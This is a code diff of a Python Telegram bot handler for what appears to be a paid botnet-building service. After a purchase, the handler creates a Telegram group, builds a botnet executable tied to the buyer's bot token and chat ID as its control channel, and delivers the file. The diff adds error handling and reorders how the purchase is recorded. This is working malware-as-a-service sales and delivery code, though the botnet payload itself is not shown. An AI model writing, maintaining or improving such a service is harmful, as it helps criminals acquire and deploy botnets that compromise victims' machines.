@@ -247,20 +247,34 @@ async def receive_bot_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(get_text("purchase_success", lang))
     await update.message.reply_text(get_text("creating_group", lang))
-    group_info = await telegram_service.setup_group_with_bot(
-        f"cybersillBot_{update.effective_user.username}", "", update.effective_user.username, bot_token=bot_token, bot_username=bot_username
-    )
+    try:
+        group_info = await telegram_service.setup_group_with_bot(
+            f"cybersillBot_{update.effective_user.username}", "", update.effective_user.username, bot_token=bot_token, bot_username=bot_username
+        )
+    except Exception as e:
+        await update.message.reply_text(get_text("group_creation_failed", lang))
+        return ConversationHandler.END
     await update.message.reply_text(get_text("group_created", lang))
-    purchase_service.add_purchase(user_id, product_id, group_info['group_chat_id'], group_info['bot_token'])
     await update.message.reply_text(get_text("building_botnet", lang))
-    exe_path = await build_service.build_botnet_exe(token=group_info['bot_token'], chat_id=group_info['group_chat_id'])
+    try:
+        exe_path = await build_service.build_botnet_exe(token=group_info['bot_token'], chat_id=group_info['group_chat_id'])
+    except Exception as e:
+        await update.message.reply_text(get_text("botnet_building_failed", lang))
+        return ConversationHandler.END
     await update.message.reply_text(get_text("botnet_built", lang))
     await update.message.reply_text(get_text("sending_botnet", lang))
-    await telegram_service.send_file(exe_path, group_info['bot_token'], group_info['group_chat_id'])
-    await update.message.reply_text(get_text("botnet_sent", lang))
+    try:
+        await telegram_service.send_file(exe_path, group_info['bot_token'], group_info['group_chat_id'])
+        await update.message.reply_text(get_text("botnet_sent", lang))
+    except Exception as e:
+        await update.message.reply_text(get_text("botnet_sending_failed", lang))
+        return ConversationHandler.END
+    
     os.remove(exe_path)
+    purchase_service.add_purchase(user_id, product_id, group_info['group_chat_id'], group_info['bot_token'])
     update_user_balance(user_id, balance - price)
     add_transaction(user_id, 'purchase', price, 'success', description=None)
+    
     await send_main_menu(update, lang)
     return ConversationHandler.END
 
